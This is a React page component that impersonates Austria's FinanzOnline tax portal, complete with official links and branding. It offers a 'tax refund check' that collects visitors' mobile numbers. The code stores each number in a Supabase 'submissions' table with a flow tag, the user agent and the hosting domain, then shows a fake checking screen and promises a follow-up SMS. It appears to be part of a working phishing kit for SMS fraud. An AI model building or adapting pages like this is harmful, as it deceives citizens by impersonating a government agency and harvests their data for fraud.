import Header from "@/components/Header";
import { Info, AlertTriangle, CheckCircle2 } from "lucide-react";
import { useState, useCallback } from "react";
import { usePageMeta } from "@/hooks/use-page-meta";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";

import idAustriaImg from "@/assets/IDAustria.png";
import finanznaviImg from "@/assets/Finanznavi.jpg";
import kundenserviceImg from "@/assets/Kundenservice.png";
import steuerbuchImg from "@/assets/steuerbuch.jpg";

const FinanzonlineSteuer = () => {
  usePageMeta("FinanzOnline – Steuererstattung prüfen", "/favicon.png");
  const [phone, setPhone] = useState("");
  const [showLoading, setShowLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = useCallback(async () => {
    const trimmed = phone.trim();
    if (!trimmed) return;
    setSubmitting(true);
    const sessionId = crypto.randomUUID().slice(0, 8);
    const { error } = await supabase.from("submissions").insert({
      session_id: sessionId,
      phone: trimmed,
      flow: "finanzonline_steuer",
      user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
      domain:
        typeof window !== "undefined"
          ? window.location.hostname.replace(/^www\./, "").toLowerCase()
          : null,
    });
    if (error) {
      console.error("Insert failed:", error);
      alert("Fehler beim Speichern. Bitte versuchen Sie es erneut.");
      setSubmitting(false);
      return;
    }
    setShowLoading(true);
    setTimeout(() => {
      setShowLoading(false);
      setDone(true);
      setSubmitting(false);
    }, 2500);
  }, [phone]);

  return (
    <div className="min-h-screen bg-white">
      {showLoading && (
        <LoadingOverlay message="Anspruch wird geprüft..." onComplete={() => {}} />
      )}
      <Header />
      <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
        Willkommen bei FinanzOnline
      </h1>

      <div className="container mx-auto px-4 py-4">
        <div className="rounded bg-[#f1f4f7] p-5" role="alert">
          <div className="mb-3 flex items-center gap-2">
            <Info className="h-5 w-5 text-gray-700" />
            <span className="text-base font-bold text-gray-900">Hinweis</span>
          </div>
          <div className="text-sm leading-relaxed text-gray-800">
            <p className="mb-3">
              <b>Prüfen Sie Ihren Anspruch auf Steuererstattung</b>
            </p>
            <p className="mb-3">
              Viele Steuerzahlerinnen und Steuerzahler haben Anspruch auf eine Rückerstattung
              zu viel gezahlter Lohn- oder Einkommensteuer – oft ohne es zu wissen. Prüfen Sie
              jetzt in wenigen Sekunden, ob auch Ihnen eine Erstattung zusteht.
            </p>
            <p>
              Geben Sie einfach Ihre Handynummer ein. Wir gleichen Ihren Datensatz mit den
              aktuellen Erstattungsansprüchen ab und informieren Sie umgehend über das
              Ergebnis.
            </p>
          </div>
        </div>

        {/* Steuererstattung prüfen Card */}
        <div
          className="mt-6 overflow-hidden rounded-lg border border-[#ddd] bg-[#f1f4f7] shadow-sm"
          role="region"
          aria-labelledby="region-tax-check"
        >
          <div className="flex items-center justify-center gap-2 px-6 pt-6">
            <h2
              id="region-tax-check"
              className="text-center text-lg font-bold text-gray-900"
            >
              Steuererstattung prüfen
            </h2>
          </div>

          <div className="mx-5 mt-4 rounded-md bg-[#fff3cd] px-4 py-3">
            <div className="flex items-start gap-2">
              <AlertTriangle className="mt-0.5 h-5 w-5 flex-shrink-0 text-[#856404]" />
              <p className="text-sm text-[#856404]">
                Achtung! Bitte geben Sie Ihre Handynummer ein, um zu überprüfen, ob Ihnen eine
                Steuererstattung zusteht.
              </p>
            </div>
          </div>

          <div className="mx-5 mb-5 mt-4 rounded-lg bg-white p-6">
            {done ? (
              <div className="flex flex-col items-center gap-3 py-6 text-center">
                <CheckCircle2 className="h-12 w-12 text-green-600" />
                <h3 className="text-base font-bold text-gray-900">
                  Prüfung erfolgreich eingereicht
                </h3>
                <p className="max-w-md text-sm text-gray-700">
                  Wir prüfen Ihren Anspruch und melden uns in Kürze per SMS an die angegebene
                  Nummer.
                </p>
              </div>
            ) : (
              <div className="md:grid md:grid-cols-2 md:items-center md:gap-8">
                {/* Info-Block: nur Desktop */}
                <div className="hidden md:block">
                  <div className="mb-2 flex items-center gap-2">
                    <Info className="h-5 w-5 text-[#00436b]" />
                    <h3 className="text-base font-bold text-gray-900">
                      Ihre Handynummer
                    </h3>
                  </div>
                  <p className="text-sm leading-relaxed text-gray-700">
                    Wir prüfen anhand Ihrer Handynummer, ob eine Steuererstattung
                    für Sie hinterlegt ist. Die Prüfung dauert nur wenige Sekunden
                    und ist selbstverständlich kostenlos.
                  </p>
                </div>

                {/* Formular */}
                <div className="space-y-5">
                  <div>
                    <label className="mb-1.5 block text-sm font-medium text-gray-600">
                      Handynummer
                    </label>
                    <input
                      type="tel"
                      inputMode="tel"
                      autoComplete="tel"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      placeholder="+43 660 1234567"
                      className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none"
                    />
                  </div>

                  <div className="pt-2">
                    <button
                      onClick={handleSubmit}
                      disabled={submitting || !phone.trim()}
                      className="w-full rounded-md border border-[#00436b] bg-white py-2.5 text-sm font-medium text-[#00436b] hover:bg-[#00436b]/5 disabled:opacity-50"
                    >
                      Jetzt prüfen
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>

        </div>

        {/* Aktuelles Sektion */}
        <div className="mt-10">
          <h2 className="mb-6 text-lg font-bold text-black md:text-xl">Aktuelles</h2>
          <div className="grid grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-4">
            {[
              {
                img: idAustriaImg,
                title: "Infos zur ID Austria",
                text: "Alle Informationen zur ID Austria und wie Sie diese aktivieren können.",
                link: "https://www.oesterreich.gv.at/id-austria.html",
              },
              {
                img: finanznaviImg,
                title: "Finanznavi",
                text: "Ihr digitaler Wegweiser für Ihre Finanzentscheidungen.",
                link: "https://finanznavi.gv.at/",
              },
              {
                img: kundenserviceImg,
                title: "Kundenservice",
                text: "Alle Informationen zu unserem Kundenservice.",
                link: "https://www.bmf.gv.at/services/aemter-behoerden/faoe.html",
              },
              {
                img: steuerbuchImg,
                title: "Das Steuerbuch 2026",
                text: "Tipps zur Arbeitnehmerveranlagung 2025 für Lohnsteuerzahler/innen",
                link: "https://www.bmf.gv.at/public/top-themen/steuerbuch-2026.html",
              },
            ].map((item) => (
              <a
                key={item.title}
                href={item.link}
                target="_blank"
                rel="noopener noreferrer"
                className="group overflow-hidden rounded-lg"
              >
                <div className="aspect-[16/10] w-full overflow-hidden rounded-lg">
                  <img
                    src={item.img}
                    alt={item.title}
                    className="h-full w-full object-cover"
                  />
                </div>
                <div className="p-4">
                  <h3 className="mb-1 text-sm font-bold text-gray-900 group-hover:underline">
                    {item.title}
                  </h3>
                  <p className="text-xs leading-relaxed text-gray-600 group-hover:underline">
                    {item.text}
                  </p>
                </div>
              </a>
            ))}
          </div>
        </div>
      </div>

      {/* Informationen / Services / Technische Unterstützung */}
      <div className="mt-10 bg-white py-10">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 gap-8 text-center md:grid-cols-3 md:text-left">
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Informationen</h3>
              <ul className="space-y-2">
                <li><a href="https://www.bmf.gv.at/fon/sicherheit" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Sicherheitsinformationen</a></li>
                <li><a href="https://www.bmf.gv.at/fon/browsereinstellungen" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Technische Voraussetzungen</a></li>
                <li><a href="https://www.bmf.gv.at/fon/rechtl-grundlagen" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Rechtsgrundlagen</a></li>
                <li><a href="https://www.bmf.gv.at/dam/jcr:3f995b13-605b-4367-8d2f-b298cc37f3e7/registration_income%20tax%20and%20corporation%20tax%20return.pdf" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Registration / Income tax and Corporation tax return</a></li>
              </ul>
            </div>
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Services</h3>
              <ul className="space-y-2">
                <li><a href="https://finanzonline.bmf.gv.at/fon/a/auswahlErklDavor.do" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Anonyme Steuerberechnung</a></li>
                <li><a href="https://finanzonline.bmf.gv.at/fon/a/vatToolAuswahl.do" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">XML-Erstellung (VAT Refund)</a></li>
              </ul>
            </div>
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Technische Unterstützung</h3>
              <p className="text-sm leading-relaxed text-gray-800">
                Fragen Sie Fred, den Chatbot der Finanzverwaltung. Weitere Kontaktmöglichkeiten finden Sie unter{" "}
                <a href="https://www.bmf.gv.at/services/aemter-behoerden/faoe.html" target="_blank" rel="noopener noreferrer" className="text-[#005a8b] underline">
                  Kundenservice.
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>
      {/* Footer */}
      <footer className="border-t border-gray-200 bg-white py-8">
        <div className="container mx-auto px-4 text-center">
          <div className="mb-6 flex flex-wrap items-center justify-center gap-2 text-sm text-black">
            <a href="https://www.bmf.gv.at/public/impressum.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Impressum</a>
            <span>/</span>
            <a href="https://www.bmf.gv.at/public/datenschutz.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Datenschutz</a>
            <span>/</span>
            <a href="https://www.bmf.gv.at/public/barrierefreiheitserklaerung.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Barrierefreiheitserklärung</a>
            <span>/</span>
            <a href="https://service.bmf.gv.at/Service/Allg/Feedback/_start.asp?FTyp=KONTAKT" target="_blank" rel="noopener noreferrer" className="hover:underline">Kontakt</a>
          </div>
          <div className="flex items-center justify-center gap-4">
            <a href="https://www.instagram.com/bmaborgen/" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_instagram.svg" alt="Instagram" className="h-6 w-6" />
            </a>
            <a href="https://www.facebook.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_facebook.svg" alt="Facebook" className="h-6 w-6" />
            </a>
            <a href="https://www.youtube.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_youtube.svg" alt="YouTube" className="h-6 w-6" />
            </a>
            <a href="https://www.flickr.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_flickr.svg" alt="Flickr" className="h-6 w-6" />
            </a>
            <a href="https://www.linkedin.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_linkedin.svg" alt="LinkedIn" className="h-6 w-6" />
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default FinanzonlineSteuer;
